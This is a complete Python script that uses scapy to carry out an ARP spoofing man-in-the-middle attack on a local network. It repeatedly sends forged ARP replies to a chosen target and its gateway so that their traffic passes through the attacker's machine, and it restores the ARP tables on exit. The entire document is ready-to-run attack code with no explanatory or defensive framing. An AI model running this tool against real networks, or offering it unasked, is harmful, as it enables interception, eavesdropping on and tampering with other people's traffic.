#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse
import sys

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
    options = parser.parse_args()
    if not options.target_ip:
        #Code to handle if an IP Address of the target is not specified.
        parser.error("[-] Please specify an IP Address of the target machine, use --help for more info.")
    elif not options.gateway_ip:
        #Code to handle if an IP Address of the gateway is not specified.
        parser.error("[-] Please specify an IP Address of the gateway, use --help for more info.")
    return options

def get_mac(ip: str) -> str:
    '''
    @param ip: IP Address of the target machine.
    '''
    try:
        arp_req_frame = scapy.ARP(pdst = ip)
        broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
        broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
        answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        #Code to handle if the IP Address is not valid.
        print(f"[{ip}] The IP Address is not valid.")
        sys.exit(1)

  
def spoof(target_ip: str, spoof_ip: str) -> None:
    target_mac = get_mac(target_ip)
    spoof_packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(spoof_packet, verbose = False)
    
def restore(source_ip: str, destination_ip: str) -> None:
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    restore_packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(restore_packet, count =1, verbose = False)

def main() -> None:
    options = get_args()
    packets_sent: int = 0
    target_ip: str = options.target_ip
    gateway_ip: str = options.gateway_ip

    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            packets_sent += 2
            print("[+] Packets Sent: {}".format(packets_sent))
            time.sleep(2)     
    except KeyboardInterrupt:
        print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

if __name__ == "__main__": 
    main()
